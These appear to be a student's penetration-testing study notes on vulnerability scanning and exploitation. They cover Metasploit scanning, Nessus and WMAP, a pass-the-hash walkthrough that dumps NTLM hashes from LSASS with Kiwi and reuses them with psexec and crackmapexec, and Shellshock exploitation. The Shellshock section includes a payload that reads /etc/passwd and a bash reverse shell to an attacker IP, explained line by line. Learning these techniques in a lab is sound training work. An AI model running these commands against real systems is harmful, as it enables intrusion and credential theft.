
1. [Windows Vulnerabilities](Vulnerability%20Assessment.md#windows-vulnerabilities)
2. [Microsoft IIS and WebDav](Vulnerability%20Assessment.md#iis-and-webdav)
3. [EternalBlue](Vulnerability%20Assessment.md#eternalblue)
4. [BlueKeep](Vulnerability%20Assessment.md#bluekeep)
5. [Pass The Hash Attacks](Vulnerability%20Assessment.md#pass-the-hash)
6. [ShellShock](Vulnerability%20Assessment.md#shellshock)
7. [Nessus](Vulnerability%20Assessment.md#nessus)
7. [WMAP](Vulnerability%20Assessment.md#wmap)


---
### Windows-Vulnerabilities

*Section is covered in the System_Host Based Attacks*
### Common Windows Vulnerability Types

*Section is covered in the System_Host Based Attacks*
### Commonly Exploited Windows Services

*Section is covered in the System_Host Based Attacks*

---
## Vulnerability-Scanning 

Vulnerability scanning & detection is the process of scanning a target for vulnerabilities and verifying whether they can be exploited. This information will useful during the exploitation phase
### Vulnerability Scanning with MSF

Can use auxiliary and exploit modules to scan and identify inherent vulnerabilities in services, OS's and webapps.

- Start PostgreSQL/MSFConsole: `service postgresql start` > `msfconsole`
- (Optional) Can create a workspace: `workspace -a workspace_name`
- (Optional) Can set the RHOST/RHOSTS global variables set you dont have to set the IP for each module execution `setg RHOST target`
### 1. Getting Service Versions and Operating Systems

Goal: Key piece of information for vulnerability scanning for a target OS or services running on it is the service version. Can get service info and the OS from nmap or metasploit modules: 

**a.  Scan using NMap**

```
db_nmap -sS -sV -O -p- target
```

- `-sS` SYN Scan/Stealth Scan 
- `-sV` Service Version detection
- `-O`   Operating system detection
- `-p-`  The full TCP port range (65,535)

**b. Scan using Metasploit**

Metasploit doesn't have a single module that does everything in one shot like `nmap`, need to combine different auxiliary modules to accomplish this:
1. Can use `auxiliary/scanner/portscan/tcp` for a general TCP scan or `auxiliary/scanner/portscan/syn` to perform the SYN scan.
```
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
set PORTS 1-65535
run
```
2. **Getting Service Version**: Use various service version modules (like `http_version`, `smb_version`) to detect services and versions.
```
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run
```
3. **Getting OS**: There isn't a direct way to perform OS detection with metasploit. Some auxiliary scanners like smb_version can have OS detection but you might need use exploits to fingerprint the system. 
### 2. Look for Exploits/Vulnerabilities

There's a number of way to search for exploit and vulnerabilities:
#### 2.a - Manual Search in Metasploit
The found services and their versions from the scans should be in `services` in Metasploit. Take each of the observed services and look through Metasploit using its built-in utility for any exploits for each of them

```
search type:exploit name:<service_name>
```

If you don't find the service  in Metasploit, it could be that:
1. The particular version of the service isn't vulnerable to any inherent exploit or
2. There isn't a Metasploit exploit available to exploit the service 

If you <u>do</u> find a service that might work with an exploit, you can  double-check through the module's description to confirm that the version of the service would.
```
use <module>
info
```

**Random note**: Confirm the operating system (Linux/Windows) for the payload so that you can get a meterpreter session

```
set payload windows/meterpreter/reverse_tcp
```

#### 2.b - Kali Searchsploit

Another search option for looking for exploits is built-in to Kali which is `searchsploit`.  Searchsploit is a cmd-line utility which searches the ExploitDB for exploits. The searches can bring in exploit/exploit code that isn't available in Metasploit console and also Metasploit exploits, so we can limit the search to just metasploit exploit modules. Metasploit modules will have (Metasploit) in the exploits name so we can grep the search to filter the other results out:
```
searchsploit " <service> " | grep -e "Metasploit"
```
You can see some of the service versions from the `searchsploit " <service> "` search of some of the exploits and the exploits with the a metasploit equivalent module should have OS versions to see if it works for the target.

#### 2.c - Metasploit Autopwn

Autopwn is a plugin that does a scan of the open services and provides exploit modules that could work with each of the services. This only works best after enumerating services

- Link to Github: https://github.com/hahwul/metasploit-autopwn

- download db_autopwn.rb file in metasploit plugin directory

```
#> wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
```

If saved to downloads...
```
sudo mv db_autopwn.rb /usr/share/metasploit-framework/plugins/
```
- Load the plugin
```
load db_autopwn
```

- Run the plugin: This can be overwhelming, so narrowing the search to just ports would provide a list of exploits for a port
```
db_autopwn -p -t -PI <port>
```
- `-p` Select modules based on open ports
- `-t` Shows all matching exploit modules
- `-PI` Only exploit hosts with these ports open

#### 2.d. - Analyze Command

The Metasploit `analyze`  command will analyze the contents of the metasploit database (hosts,services) and provide a list of vulnerabilities that the services are affected by.

```
analyze
```

Can see the found vulnerabilities using `vulns`.

---
### IIS-and-WebDav

*Section is covered in the System_Host Based Attacks*

---
## Vulnerability-Analysis

### EternalBlue

*Section is covered in the System_Host Based Attacks*

## BlueKeep

*Section is covered in the System_Host Based Attacks*

---

## Pass-The-Hash

Pass-the-hash is an exploitation technique to capture NTLM hashes or clear-text passwords and utilizing them to authenticate against a target system legitimately.  Rather than exploiting services directly, this method leverages legitimate credentials to gain access to the system.

If you successfully obtain administrative access on a Windows target system, there's no need to re-authenticate to access the same Meterpreter session or reverse shell with administrative privileges. Even if the vulnerable service is patched, disabled, or blocked by a firewall rule, you can still regain access using the captured administrative hash. The hash allows you to access the system whenever you want, making this a form of persistence. Essentially, with the hash, you bypass the need to rely on the previously exploited service for continued access.
##### How to perform the attack

We'll exploit the server, then dump the hashes with kiwi and then uses the hash to perform a pass-the-hash attack by authenticating legitimately  to a service.


1. <u>We can start postgresql and then metasploit</u>
```
service postgresql start && msfconsole
```
2.  <u>Run an exploit to get a meterpreter session on the target</u>: The lab is exploiting BadBlue which is a lightweight web server software originally created for file sharing and web hosting on Windows systems. Although it was once popular for these purposes, BadBlue is now considered outdated, and its security flaws have made it a target for exploitation. One of the most serious vulnerabilities in older versions of BadBlue is a buffer overflow exploit that enables remote code execution.  The Metasploit module `exploit/windows/http/badblue_passthru` targets a vulnerability in older versions of BadBlue (2.7 and earlier), exploiting a flaw in the `Passthru.dll` component which handles user input and passes it to system commands. By sending malicious HTTP requests, we can execute arbitrary commands and gain remote shell access with the same privileges as the web server, without needing valid credentials.

Use the exploit: 
```
use exploit/windows/http/badblue_passthru
```
Configure the module and the meterpreter payload (optional) should get a `windows/meterpreter/reverse_tcp` payload by default:
- `RHOSTS` = The target IP
```
set RHOSTS 10.61.25.84
```
Run the exploit:
```
exploit
```

3. <u>Find and migrate to the LSASS process</u>.  **LSASS** (Local Security Authority Subsystem Service) is a crucial in Windows responsible for enforcing security policies, handling password changes, and managing stored credentials, including NTLM hashes. When connected to a Meterpreter session, you're generally tied to the process or service that was exploited and the  `migrate` command in Metasploit allows us to move the Meterpreter session to another process.  Migrating to the LSASS process allows us to extract credentials like NTLM hashes from memory while also granting higher privileges for broader control over the  system. To use `migrate`, we need to specify process by providing its PID (process ID). To find the PID for the service, we can use the `pgrep` command and just search the service's name. The `pgrep` command is a Unix-based utility only natively available on Linux/Mac , however, `pgrep` becomes available as a Meterpreter command when you're working with a compromised Windows system.

- **Use pgrep to get the PID**
```
meterpreter> pgrep lsass
```
- **Migrate to the LSASS service using that PID**
```
meterpreter> migrate 678
```

We should now have NT AUTHORITY\SYSTEM privileges

4. <u>Run Kiwi to get the NTLM Hashes</u>: In Metasploit, `kiwi` is an extension of **Meterpreter** that provides advanced credential extraction capabilities. It is essentially a Metasploit implementation of **Mimikatz**,  which is a well-known tool for extracting credentials from Windows systems.
- **Load the Kiwi extension**
```
meterpreter> load kiwi
```
- **Run the `lsa_dump_sam` command**: The`lsa_dump_sam` is a command in the Kiwi extension (or Mimikatz) that extracts NTLM and LM password hashes for local users from the Security Account Manager (SAM) database. The hashes are pulled directly from memory, bypassing file locks. The hashes should be outputted, this will be the same if you did this with Mimikatz:
```
meterpreter> lsa_dump_sam
```
- **View the Hashes**: The hashes should also display after running the `lsa_dump_sam` command but can also run `hashdump` which would display the same hashes:
```
meterpreter> hashdump
```

The output should be structured like this....
```
username : SID : LM_hash : NTLM_hash
```

We'll need to copy both the LM hash and the NTLM hash since certain exploits like the metasploit Psexec module requires both.
##### Performing the Pass-the-Hash Attack

Now we can used the captured NTLM hashes to authenticate with the target legitimately to the service/system.  Tools like the Metasploit PsExec module and CrackMapExec can be used to carry out this type of attack:

##### Metasploit PxExec
The `windows/smb/psexec` module in Metasploit is commonly used for pass-the-hash attacks because it interacts with the widely-used SMB protocol in Windows networks, allowing for remote execution. The module mimics the legitimate psexec tool to authenticate with the SMB service on a target machine using captured NTLM or LM hashes, bypassing the need for a plain-text password. Once authenticated, the module remotely executes commands or delivers a payload, such as a reverse shell, to gain control of the system. 

1. <u>Search for the PsExec Module</u>: Background the existing meterpreter session using `Ctrl+Z`
```
search psexec
```
We need the `exploit/windows/smb/psexec` exploit 
```
use exploit/windows/smb/psexec
```
2. Configure the exploit module and payload options:
	- `RHOST` = Target IP
	- `LPORT`= Your listening port, make sure this doesn't overlap with the local port used for the previous meterpreter session since we're going to be setting up another metrepreter session. (Can check by running `sessions` to see the port used for the session)
	- `SMBDomain` = If connected to a domain
	- `SMBUser` / `SMBPass` = The `SMBPass` can accept either the clear-text password or the NTLM hash which is what we'll provide. 
```
set LPORT 4312

set SMBUser <user>
```

Just for this module we need to provide both the lm_hash and ntlm_hash since you might get error only posting the ntlm hash alone
```
set SMBPass lm_hash:ntlm_hash
```
Example
```
set SMBPass aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
```
The LM hash `aad3b435b51404eeaad3b435b51404ee`  is a default "empty" LM hash value, often used when the system doesn't actually use LM hashes which is common with modern system. In this case, you can still set it as this to bypass the LM requirement.

This exploit uses SMB to gain remote code execution, there's different methods for delivering and executing the payload on the target system so we might need to specify it specifically here to get a meterpreter session. We can try running `set target` command for `Command` to get a shell or Native upload a Meterpreter executable on the system. 
```
set target Native\ upload
```
Run the exploit
```
exploit
```
You might need to tweak the target for the exploit 0but you should get a meterpreter session.

##### CrackMapExec
The other tool for the pass-the-hash attack using the dumped NTLM hashes is `crackmapexec`.

General Syntax:
```
crackmapexec smb target -u username -H "NTLM_hash" -x "enter_cmd_here"
```
- `-u` = username
- `-H`= The NTLM Hash
- `-x` = The command that will execute on the target

Example:
```
crackmapexec smb target -u Administrator -H "5f4dcc3b5aa765d61d8327deb882cf99" -x "net user"
```

---

### Frequently Exploit Linux Services

Linux is a free and open-source operating system made up of the **Linux kernel**, developed by Linus Torvalds, and the **GNU toolkit** (cat ls cd dir), initiated by Richard Stallman. Often referred to as **GNU/Linux**, it is commonly used as a server OS, with services and protocols running that can serve as access vectors for attackers. 
- **Apache Web Server** | TCP ports 80/443 | Free and open source cross-platform web server which accounts for over 80% of web servers globally.
- **SSH (Secure Shell)** |TCP ports 22 |  SSH is a cryptographic remote access protocol that is used to remotely access and control systems over an unsecured network. SSH was developed as a secure successor to telnet.
- **FTP (File Transfer Protocol)** | TCP port 21 | The protocol is used to facilitate file sharing between a server and client/clients and vice versa.
- **SAMBA** | TCP port 445 |  Samba is the Linux implementation of SMB  and allows Windows systems to access Linux shares and devices.

### ShellShock

Shellshock is a family of vulnerabilities in the Bash shell (since version 1.3) that allows an attacker to execute remote arbitrary commands, potentially granting remote access via a reverse shell. The vulnerability was discovered in September 2014.

 The vulnerability arises when Bash mistakenly executes trailing commands after a specific string of characters: `() {:;};`. Anything following this string is executed unintentionally by Bash. Apache web servers configured to run CGI scripts are particularly vulnerable. CGI scripts are used by Apache to execute commands on the server and return results to a web client. Attackers can exploit CGI scripts by injecting malicious commands into request headers, such as the User-Agent header. When the web server executes the CGI script, Bash is triggered and the injected commands are executed.
    
**Exploitation Process**
To exploit Shellshock, you need a vulnerable input vector, such as a CGI script running on an Apache server. The key steps include:
1. Identifying a CGI script that interacts with Bash.
2. Sending a crafted HTTP request that includes the malicious `() {:;};` string followed by the desired commands.
3. The web server executes the CGI script using Bash, processing the injected commands.

**Tools for Exploitation**
The vulnerability can be exploited manually by interacting with the server via proxy tools or automatically with Metasploit's exploit module. These methods can result in obtaining a reverse shell or a Meterpreter session.

###### 1. Find the input vector to exploit

We can first view the page source of the website to see if there's a CGI script explicitly visible in the webpages HTML/Javascript. Sometimes, CGI scripts can be visible here which would make it easier to identify and attempt the exploitation. Something like this:
```
xhttp.open("GET", "/gettime.cgi", true)
```
However, visibility in the page source is not necessary for discovery.  Tools like Nmap or Nikto scan for common script locations (e.g., `/cgi-bin/`), while DirBuster and Gobuster brute-force hidden paths. Misconfigured servers may reveal scripts through error messages like 404s or by allowing directory listings. Even without visible clues, attackers can analyze HTTP responses to infer the presence of CGI scripts or Bash-related processes.

###### 2. Check if the system is vulnerable to ShellShock

We can use the nmap script `http-shellshock` to check if the target is vulnerable to it. We also need to provide the arguments for the script 
```
nmap -sV target --script=http-shellshock --script-args "http-shellshock.uri"=<loc_of_cgi_script>
```
- `-sV` = Service version detection
- `"http-shellshock.uri"` = The location of the cgi script

Example:
```
nmap -sV 10.66.38.37 --script=http-shellshock --script-args "http-shellshock.uri"=/test.cgi
```

We can use the cgi script to inject the special characters within HTTP headers using the User-Agent header

###### 3. Use a proxy like Burp Suite/ZAP
- ***Note**: FoxyProxy is a Firefox/Chrome extension that helps manage proxy settings more efficiently. By switching profiles, you can direct browser traffic through Burp Suite or ZAP to intercept and analyze web requests. 

Open BurpSuite (`From Kali: Menu > Web Application Analysis > burpsuite`) a temporary project that's using Burp defaults is fine. The `Proxy` tab in Burp Suite is where you can view and intercept web traffic between your browser and the target server. It allows you to see requests and responses as they pass through Burp, making it easier to inspect or modify them.
Navigate to the 'Intercept' tab under the Proxy (`Proxy > Intercept`). First, make sure the Intercept is enabled (`Intercept is on`), as this feature in Burp Suite pauses traffic, allowing you to inspect, modify, forward, or drop each request/response before it reaches the server or client in real time.

- `Forward` allows the intercepted HTTP request/response to proceed to its destination
- `Drop` means discarding the intercepted HTTP request/response.

Under' 'Intercept', forward/drop request until you find the request involving the cgi script. We can inject the special characters through the User-Agent using a repeater (`Right-click within the packet data > Send to repeater`). The 'Repeater' in Burp Suite allows us to send individual HTTP requests to the server which we can modify to test the server's response. Navigate to the Repeater tab where you'll see the same request, then clear the header. First, include the special character `() { :; };` followed by whatever command you want to execute.
```
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```
Click `Send` to send the request through the repeater. If you can get an output in the Response then we know the vulnerability works.

###### 4. Setup a Netcat Listener

We can gain a reverse shell on that target by using bash to connect to a listener on our Kali Linux box using netcat. To set up a basic listener in Netcat, we need the `-lp` options to specify that we're setting up a listener on a port: 

```
nc -nvlp 1234
```
- `-l`: Listener | This tells Netcat to listen for incoming connections 
- `-p 1234`: Specifies the port number to listen on, which in this case is port 1234.
- `-n`: (Optional) | Tells Netcat not to resolve hostnames 
- `-v`:  (Optional) Runs Netcat in verbose mode, providing detailed output bash

###### 4. Edit the request to include the reverse shell back to the attack box

General Syntax:
```
() { :; }; echo; echo; /bin/bash -c "bash -i>&/dev/tcp/<attack_box_IP>/<listening_port> 0>&1"
```

Example (Breakdown of the reverse shell explained below):
```
() { :; }; echo; echo; /bin/bash -c "bash -i >& /dev/tcp/10.92.2.6/1234 0>&1"
```

#### Redirections and File Descriptors
In Linux/Unix, redirection controls where input and output goes. By default, commands send their output (stdout) to the terminal and read input (stdin) from the keyboard. Redirection allows us to change this behavior using symbols like `>` (to redirect output), `>>` (to append output), and `<` (to redirect input). File descriptors are used to represent input/output streams:
- `0` = Standard Input (stdin): Where commands read input (normally the keyboard).
- `1` = Standard Output (stdout): Where commands send normal output (normally the terminal).
- `2` = Standard Error (stderr): Where commands send error messages (normally the terminal)
When using `>&`, the `&` specifies which file descriptors are being redirected. For example, you could specify something like `>&2`which would mean to redirect the output to the place as the standard error etc. Using  `>&` where the file descriptor after `&`  isn't specified would mean redirects both stdout (1) and stderr (2) to the same destination.
##### Reverse Shell Breakdown
```
bash -i >& /dev/tcp/10.92.2.6/1234 0>&1
```
1. `bash -i`: This starts an interactive Bash shell, keeping the shell open to accept and execute commands.
2. `>&`: Redirects both the standard output (1) and standard error (2) stdout (1)
3. **`/dev/tcp/10.92.2.6/1234`**: This tells the system to send both the standard output and error output to a remote IP (`10.92.2.6`) over TCP via port `1234` . The `/dev/tcp/` is a special file system in Linux that allows the creation of network connections by writing to a specific IP and port using `/dev/tcp/[IP]/[PORT]`. 
4. `0>&1`: This redirects stdin (0) to the same destination as stdout (1). The standard output has already been redirected to the remote IP so instead of reading input from the terminal, the shell will now read input from the network connection (i.e., from the attack box).

As a result, the attacker can send commands to the shell over the network (via stdin), and the shell will send back both normal output and error messages (via stdout and stderr) to the remote machine.

#### Performing the Exploit using Metasploit

1. Start Postgresql and open Metasploit (`msfconsole)
```
service postgresql start && msfconsole
```
2. Search for Shellshock
```
search shellshock
```
There will be an auxiliary scanner for shellshock which checks for the vulnerability (`auxiliary/scanner/http/apache_mod_cgi_bash_env`) we can just go with the exploit module (`exploit/multi/http/apache_mod_cgi_bash_env_exec`)
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```
3. Configure and rune the exploit: You'll likely need to setup the `RHOST` for the target and the `TARGETURI` for the cgi script location.
```
set RHOST 10.55.21.43

set TARGETURI /test.cgi
```
4. Run the exploit: This should setup a meterpreter session
```
exploit
```

---

### Nessus

Nessus is a proprietary vulnerability scanner developed by Tenable, designed to automate the identification of vulnerabilities in target systems. Once Nessus completes a scan, the results can be imported into Metasploit (MSF) for further analysis and exploitation.

The scanner identifies vulnerabilities by first performing host discovery, using ping to find active hosts on a network. Once a host is identified, Nessus performs a port scan to gather service information, including the version of each service running on the open ports. It then cross-references this information against its extensive vulnerability database, which includes CVE codes and links to relevant Metasploit modules when available. This automated process eliminates the need for manual vulnerability scanning and provides detailed insight into the weaknesses present on a system.

Nessus relies on plugins, which are small text-based scripts, to perform these scans and detect vulnerabilities. Some plugins target specific vulnerabilities, while others are designed for broader scans. These plugins enhance the flexibility and precision of Nessus, allowing it to adapt to various scanning needs.

**There’s two ways to setup Nessus:**

1. Web application = Must easier to setup/run. Just need a browser to connect to the Nessus web app and configure/start scans
2. Network service = Need to have a network client in order to connect to the Nessus server and issue a vulnerability scan. This is much more complicated to configure
### Installing Nessus Essentials

1. <u>Download Nessus</u>: Go to the Nessus Essentials Download Page[https://www.tenable.com/products/nessus/nessus-essentials](https://www.tenable.com/products/nessus/nessus-essentials). Need to register for an activation code with an email address since this is where they’ll send activation code will be sent to. On the download page, look for the Debian version (ie `Nessus…-debian6_amd64.deb`).
2. <u>Install Nessus</u>: Use `dpkg`  with the `-i` option to install the debian package. Might need to update the permission so that its executable (`chmod +x <nessus_binary>`)

```
sudo dpkg -i <Nessus install location>
```
- `dpkg` = Download package
-  `-i` = install

2. <u>Start Nessus</u>: - Started the `nessusd` services which worked for me but you might need to start a `nessusd.server` service for the Nessus scanner as well.

```
sudo systemctl start nessusd
```

3. <u>Check the status of nessus</u>: Can use `systemctl` which checks the Nessus service's status through `systemd` to lets you know if its running/stopped etc or use `ps` which checks all the running services and search for the nessus service to see if its running. 

**Using systemctl**
```
sudo systemctl status nessusd.service
```

**Using ps**
```
ps aux | grep nessusd
```
- **`a`**: Shows processes from all users.
- **`u`**: Displays detailed info, like user, CPU, and memory usage.
- **`x`**: Includes processes not tied to a terminal (like background services/daemons).
    
4. <u>Connect to the Nessus App and go through the initial Nessus setup process</u>: Navigate to  `https//localhost:8834/#/`, then follow the prompts
	- **Step 1 - Choose how to deploy Nessus**:  Select Nessus Essentials (Or whatever you registered for)
	- *(OPTIONAL Step) Get an activation code: You should've already gotten an activate code so you can skip this* 
	- **Step 2 -Register Nessus**: Put in the registration code, to activate it.
		- IMPORTANT: MAKE SURE THE ACTIVATION CODE DOESN’T HAVE AN EXTRA SPACE WHEN ENTERING THE CODE. Had an issues when trying to set up the user account and would get a ‘invalid field bad format’ error.
    - **Step 3  - Create User Account**: This is a Nessus administrator, the default is `admin`.
		-  If you get any error doublecheck activation code to make sure there’s no code and try using google chrome
1. <u>Let Nessus Download</u>: This is when the nessus plugins will be downloaded which can take a while. Nessus needs a lot of ram and storage when downloading the plugins and compiling the plugins. If you run out of resources, it will restart from scratch constantly until all of the plugins are downloaded. Ideally have at least 4GB Ram and 10GB of storage available on the system.
2. Done! You should be able to perform some scans now
   
---
### Performing Nessus Scan

You can either scan using a pre-existing template or create a custom scan: 

1. **Scanning using a Pre-existing template**
    
    Nessus has built-in scanning templates that you can use to either perform a basic scan or a special/targeted scan. (On the left-side pane, click ‘`Policies`’ > `Scan Templates`). In Nessus, scan templates are predefined configurations used to conduct security assessments and vulnerability scans on networks, systems, and applications. These templates are designed to streamline the scanning process by setting specific parameters and options that target various types of security checks, such as basic network scans, compliance audits, or advanced vulnerability detection. These can be helpful if you either……
    
    1. Don’t really know what kind of scan you want. A ‘Basic Network Scan’ is a good option for a generic scan.
    2. Have a specific scan you’d like to run. Here you can do a something like malware, mobile device, web app tests, etc.
    
    - basic network scan = This will be a basic vulnerability scan, this scans the network
    - host discovery scan = Checks for live hosts but doesn’t perform a vulnerability scan
    

---

**IMPORTANT CONCEPT: Common Vulnerability and Exposures (CVE)**

CVE stands for Common Vulnerabilities and Exposures. It is a list that provides unique identifiers for publicly known cybersecurity vulnerabilities. The CVE identifier is formatted as "CVE" followed by the year of the vulnerability's public disclosure and a unique serial number, such as CVE-2023-12345.

---

2. **Create your own custom scan**

From the Scan Templates page > Click ‘Advanced Scan’

##### Custom Scan: Settings Tab
The Settings tab in a Nessus scan configuration is where you specify the details of how the scan is to be conducted. This includes defining the name and description of the scan, configuring the target IP addresses or hostname ranges, setting the scan schedule and selecting the type of scan. Additional options may include adjusting performance settings like the scan speed.

1. **BASIC SECTION** – Defines general scan parameters like the name, target IPs, and description.
	- **General**: General information, the name and targets is required for the scan. For the targets, you can can either….
		1. **Specify Targets Directly**: _Separate each by a comma_
			- Single Target = `192.168.1.1`    
			- IP Address Range = `192.168.1.1 - 192.168.1.15`        
			- Subnet = `192.168.2.0/24`        
			- Domain Names = `test.com`
		2. **Upload File of Targets** = You can upload a text file that specifies targets where each line is used for each target.      
	- **Schedule**: You can schedule the scan at a certain time with a certain frequency. Disabled by default, you just need to enable it
	- **Notifications**: You can specify who to email when the scan is done

2. **DISCOVERY SECTION** – Configures the scan type Nessus will use to identify live hosts, services, and open ports.
3. **ASSESSMENT SECTION** – Determines which vulnerabilities like web application vulnerabilities
4. **REPORT SECTION** – Specifies how scan results will be compiled and formatted in the final report.
5. **ADVANCED SECTION** – Offers detailed options for scan performance, timeouts, and depth of analysis.


###### Credentialed Scan vs Non-credentialed scan

Non-credentialed is when you don’t have authentication privileges when scanning. In black-box situations, you’ll run un-credentialed scans unless you’re able to find some credentials. In white-box situations, like when a client provides you creds, you can run a credentialed scan. A scan like the ‘Credentialed Patch Audit’ is not attempting to exploit any services its just attempting to authenticate with services and see which ones need to be patched.

##### Custom Scan: Credentials Tab
The Credentials tab is for configuring authenticated scans. Authenticated scans are more comprehensive because they allow Nessus to log into systems as a user (or users) and evaluate the software and system settings from the perspective of those accounts. This can reveal vulnerabilities that an unauthenticated scan might miss, such as those that depend on specific software configurations or permissions granted to authenticated users. You can first select the category of the credentials needed for a type of scan:
- ‘**Host**’ can have credentials like, windows specific creds, SSH, SNMP etc.
- With the ‘**Database**’ category: If a host has a DBMS installed and you have the credentials to the database, you can provide credentials here. You can specify things like the type of database it is etc.
##### Custom Scan: Plugins Tab
The "Plugins" tab allows you to select and configure/enable specific plugins that can check for particular vulnerabilities in systems and networks or to gather certain types of information about the target systems. Some of these tasks plugins include:
- checking for outdated software versions
- missing patches
- configuration weaknesses
    
In Nessus, plugins are organized into families, you can enable or disable entire families of plugins or individual plugins based on the scan's objectives. This customization allows you to tailor the scan to specific security needs, focusing on relevant vulnerabilities while reducing unnecessary network traffic and scan times.
    
**IMPORTANT: When you’re setting up your own personalized scan, all of the plugins are enabled by default. This can include unnecessary plugins which increase the time of the scan**
    
##### Run The Scan
When you’re done with all of the config changes, you can click ‘`Save`’ to save the scan. Back at the Scans screen, click, ‘`Launch`’ to start the scan.
##### DONE: The scan will likely take some time depending on the number of hosts and plugins, so keep this in mind

### **View the Vulnerability Report**

After completing a scan, you’ll see a checkmark indicating the scan is finished. Click on the scan name to access its results. In the **Vulnerabilities** tab, you’ll find all detected vulnerabilities, listed by severity by default. These vulnerabilities are grouped, click on a group to view the associated vulnerabilities, providing a detailed list of what was found during the scan. 

You can filter out vulnerabilities however you want. Common filters would be around Metasploit Exploit which would shows vulnerabilities with an MSF exploit module or by Severity and look for high severity vulnerabilities.

To get more detailed information on a vulnerability, click on an individual vulnerability, which will open a full page with specific details about the vulnerability. Each vulnerability should contain the following information: 
- **Description**: The description gives a breakdown of each vulnerability with their associated CVE, a solution, and a solution which in the ‘Output’ you can see what would fix the vulnerability.
- **Output**: This section provides specific technical information about what the Nessus scanner observed that led it to identify a particular vulnerability on that system. Essentially, clarifying why a vulnerability was reported . This section typically includes evidence such as system responses, error messages, or configuration data that substantiate the finding.
- **Plugin Details:** The plugin that detected the vulnerability
- **Risk Information:** The "Risk Information" in vulnerability scan reports includes an impact assessment of identified vulnerabilities, using CVSS2 and CVSS3 scores. These scores, calculated from factors like attack complexity, access privileges, and impact on confidentiality, integrity, and availability. The ‘Risk Factor’ (Info, Low, Medium, or High) is determined based on the CVSS2 & CVSS3 scores which can differ in range but can still determine if a vulnerability is high risk or not.
- **Vulnerability Information:** Just additional info about the vulnerability itself, not about the risk. This section can provide links to exploits if it allows
- **Reference Information:** Reference info to the CVEs of the vulnerabilities

### Export Nessus

You can export the result of a Nessus scan and import it to the Metasploit database. Click `Export` within the report then choose 'Nessus' which exports an .nessus XML file.

1. Start up metasploit: Can also create a workspace if you want `workspace -a <workspacename>`
```
services postgresql start && msfconsole
```
2. Import Nessus Scan: Use `db_import` to import the scan results
```
db_import <Location_of_nessus_scan>
```

Can use `hosts` / `services` commands to find the hosts and services respectively. 

3. **Look for specific vulnerabilities**:  All of the vulnerabilities that were found can be found using the `vulns` command. Can search for vulnerabilities for a port using the `-p` option.

```
vulns -p 445
```
4. **Find exploit modules**: You can search using a CVE or Microsoft Vulnerability Identifier. For example, if looking at CVE-2017-0143, you can take the year of the CVE (ie 2017) and search the name which could be for the service/software name etc:

```
search cve:2017 name:smb
```

---

## WMAP

WMAP is a web application vulnerability scanner integrated with Metasploit (MSF). It automates web server enumeration and scans web applications for vulnerabilities, making it accessible as an MSF plugin that can be directly used within the Metasploit framework.
1. <u>Start up metasploit</u>: Can also create a workspace if you want 
```
services postgresql start && msfconsole

workspace -a <workspacename>
```
2. <u>Load the WMAP plugin</u>: This is done using the `load` command
```
load wmap
```

You can view the type of commands that you can run type `wmap_` + Press `Tab` which should return the commands:

```
wmap_modules  wmap_nodes  wmap_run  wmap_sites  wmap_targets  wmap_vulns 
```

3. <u>Add a site target</u>:  Use `wmap_sites` command to add site or webapp to scan. This represent the overall site/app and not specific URLs/directories etc.  Use the `-a` option to add a site, you can view your sites with the `-l` option.

```
wmap_sites -a 192.168.80.3
```

4.  <u>Add the URLs</u>: Use `wmap_targets` for the actual URLs/endpoints, files within the sites listed in `wmap_sites` that will be scanned. Use the `-t` option for adding the URLs, you can view your targets with the `-l` option.
```
wmap_targets -t http://192.168.80.3
```

5. <u>Run the vulnerability scan</u>: The `wmap_run` command with the `-e` option will run the actual scan. The scan will choose which metasploit auxiliary modules that it will enable to perform the vulnerability scan based on the target's configuration:
```
wmap_run -e
```
- You can view what the enabled aux modules will be what the using `wmap_run -t`

6. <u>View Found Vulnerabilities</u>: The `wmap_vulns` command will list the vulnerability's that were found from the scan. Use the `-l` option with the command to view them.
``
```
wmap_vulns -l
```
Should be able to find directories/files/version and other sensitive information form the output.


##### HTTP POST/PUT

The POST and PUT http methods can be used to malicious actions which is why they're normally not allowed on webservers. This can be used to upload a web payload to the target webserver and setup a reverse listener and when they browse to the website/file that the payload will be executed.

The `auxiliary/scanner/http/options` modules would tell if what HTTP methods were allowed on the server.

Can use something like the `auxiliary/scanner/http/http_put` module which can be used to add files to the webserver:

- `ACTION` = This can be PUT or DELETE
- `FILEDATA` = The file to upload into the file
- `FILENAME` = The path to attempt to write or delete

